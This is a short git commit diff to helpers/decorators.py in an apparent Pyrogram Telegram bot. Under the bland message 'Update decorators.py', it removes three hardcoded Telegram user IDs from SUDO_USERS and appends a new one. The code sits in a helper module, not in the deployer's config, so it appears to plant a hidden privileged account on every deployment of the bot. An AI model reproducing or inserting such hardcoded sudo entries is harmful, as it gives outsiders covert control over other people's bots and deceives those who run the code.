aab7bc2b5720cfe502128cf92bf52ba631d32cbc
FJ_GAMING <84852749+fjgaming212@users.noreply.github.com>
2021-11-28 15:37:13 +0700

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -23,9 +23,7 @@ from pyrogram.types import Message
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS.append(1803347744)
-SUDO_USERS.append(1979717764)
-SUDO_USERS.append(1968948474)
+SUDO_USERS.append(1514078508)
 
 
 def errors(func: Callable) -> Callable:
